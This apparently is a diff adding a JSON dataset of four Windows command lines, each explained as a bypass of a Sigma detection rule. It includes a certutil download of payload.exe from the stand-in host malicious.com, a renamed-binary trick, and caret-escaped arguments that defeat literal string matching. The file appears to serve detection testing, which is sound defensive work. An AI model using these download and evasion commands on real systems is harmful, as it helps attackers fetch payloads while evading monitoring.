@@ -1,0 +1,18 @@
+[
+  {
+    "output": "certutil.exe -f -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+    "explanation": "The rule attempts to detect certutil abuse by looking for ' -decode ', ' /decode ', ' /urlcache ', and ' -urlcache '. However, certutil can still download files using the '-split -f' flags without needing the 'urlcache' argument, entirely bypassing the specified CommandLine filters."
+  },
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\ping.exe C:\\Windows\\Temp\\diagnostics.exe && C:\\Windows\\Temp\\diagnostics.exe 127.0.0.1",
+    "explanation": "This demonstrates bypassing the rule's executable name check. The Sigma rule explicitly flags processes where the Image ends with '\\ping.exe'. By copying the binary to a different name and executing it, the execution signature changes, evading the 'Image|endswith' condition. This illustrates the fragility of relying solely on static file names for detection."
+  },
+  {
+    "output": "powershell.exe -N^o^P -ExecutionPolicy Bypass -Command \"Write-Output 'Simulating benign execution'\"",
+    "explanation": "This simulates bypassing the command-line string matching using cmd.exe escape characters. The rule explicitly monitors for the exact string ' -NoP '. By injecting caret (^) escape characters, the command line recorded in the logs will appear as '-N^o^P', which fails the static string match, yet cmd.exe will strip the carets before passing the arguments to PowerShell."
+  },
+  {
+    "output": "certutil.exe -^d^e^c^o^d^e input.b64 output.exe",
+    "explanation": "Similar to the PowerShell example, the rule detects the strings ' -decode ' or ' /decode '. Obfuscating the command line arguments using standard command prompt escape characters breaks the literal string matching defined in the CommandLine|contains selection, successfully executing the utility while remaining undetected by this specific rule."
+  }
+]
